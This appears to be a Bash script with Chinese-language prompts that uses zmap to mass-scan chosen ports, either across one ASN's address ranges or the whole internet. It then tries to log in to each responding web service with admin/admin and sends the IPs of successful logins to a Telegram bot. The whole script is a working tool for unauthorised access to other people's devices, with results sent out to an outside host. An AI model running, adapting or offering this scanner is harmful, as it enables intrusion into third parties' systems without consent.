#!/bin/bash

dir_path="/root/sub"
ip_file="$dir_path/asn_ips.txt"
blacklist_file=$(mktemp)
telegram_bot_token=""
telegram_chat_id=""

cat <<EOL > $blacklist_file
255.255.255.255
10.0.0.0/8
172.16.0.0/12
192.168.0.0/16
EOL

if [ ! -d "$dir_path" ]; then
    mkdir -p "$dir_path"
    if [ $? -ne 0 ]; then
        echo "无法创建目录 $dir_path，检查权限。"
        exit 1
    fi
fi

read -p "请输入端口（支持多个端口和端口范围，例如：1000-5000或9999,8888,6666）: " target_ports
read -p "请选择模式 (1-指定ASN的IP, 2-全球IP): " scan_mode
read -p "请输入 Telegram bot token: " telegram_bot_token
read -p "请输入 Telegram chat ID: " telegram_chat_id

if [ "$scan_mode" == "1" ]; then
    read -p "请输入要查询的ASN (例如:8075): " asn
    python3 - <<EOF
import argparse
import requests
import re
import os

def get_asn_cidrs(asn):
    try:
        url = f"https://api.hackertarget.com/aslookup/?q={asn}"
        response = requests.get(url)
        if response.status_code != 200:
            print(f"Error retrieving ASN info from API: {response.status_code}")
            return []
        
        cidrs = response.text.splitlines()
        ipv4_cidrs = [cidr for cidr in cidrs if re.match(r'^\d+\.\d+\.\d+\.\d+/\d+$', cidr)]
        return ipv4_cidrs
    except Exception as e:
        print(f"Error retrieving ASN info: {e}")
        return []

asn = "$asn"
cidrs = get_asn_cidrs(asn)
output_dir = "$dir_path"
if not os.path.exists(output_dir):
    os.makedirs(output_dir)

output_file = os.path.join(output_dir, "asn_ips.txt")

with open(output_file, "w") as f:
    for cidr in cidrs:
        f.write(cidr + "\n")

print(f"ASN IP list saved to {output_file}")
EOF

    if [ ! -f "$ip_file" ]; then
        echo "文件 $ip_file 不存在，请检查路径 $ip_file。"
        exit 1
    fi

    IFS=',' read -ra PORT_ARRAY <<< "$target_ports"
    for port in "${PORT_ARRAY[@]}"; do
        zmap -p "$port" -B 100M -T 5 -o - --source-ip=0.0.0.0 | grep -v -f $blacklist_file | while read -r zmap_ip; do
            echo "Processing IP: $zmap_ip"  # 添加输出Debug log
            (
                if curl --max-time 1 http://"$zmap_ip":"$port" >/dev/null 2>&1; then
                    res=$(curl "http://$zmap_ip:$port/login" --data-raw "username=admin&password=admin" --compressed --insecure)
                    if echo "$res" | grep -q "true"; then
                        echo "$zmap_ip" >> "/root/week.log"
                        curl -s -X POST "https://api.telegram.org/bot$telegram_bot_token/sendMessage" -d chat_id="$telegram_chat_id" -d text="成功登录IP: $zmap_ip" -d parse_mode="Markdown"
                    fi
                    echo "$zmap_ip" >> "/root/all.log"
                fi
            ) &
            if (( $(jobs -r -p | wc -l) >= 10 )); then
                wait -n
            fi
        done
        wait
    done

elif [ "$scan_mode" == "2" ]; then
    IFS=',' read -ra PORT_ARRAY <<< "$target_ports"
    for port in "${PORT_ARRAY[@]}"; do
        zmap -p "$port" -B 200M -T 2 -o - | grep -v -f $blacklist_file | while read -r zmap_ip; do
            echo "Processing IP: $zmap_ip"  # 添加输出Debug log
            (
                if curl --max-time 1 http://"$zmap_ip":"$port" >/dev/null 2>&1; then
                    res=$(curl "http://$zmap_ip:$port/login" --data-raw "username=admin&password=admin" --compressed --insecure)
                    if echo "$res" | grep -q "true"; then
                        echo "$zmap_ip" >> "/root/week.log"
                        curl -s -X POST "https://api.telegram.org/bot$telegram_bot_token/sendMessage" -d chat_id="$telegram_chat_id" -d text="成功登录IP: $zmap_ip" -d parse_mode="Markdown"
                    fi
                    echo "$zmap_ip" >> "/root/all.log"
                fi
            ) &
            if (( $(jobs -r -p | wc -l) >= 10 )); then
                wait -n
            fi
        done
        wait
    done
else
    echo "无效的选项，请选择 1 或 2"
    exit 1
fi

rm -f $blacklist_file

log_content=$(<"$dir_path/week.log")
send_message_url="https://api.telegram.org/bot$telegram_bot_token/sendMessage"
curl -s -X POST $send_message_url -d chat_id="$telegram_chat_id" -d text="$log_content" -d parse_mode="Markdown"

echo "脚本执行完毕，已将结果发送到Telegram"
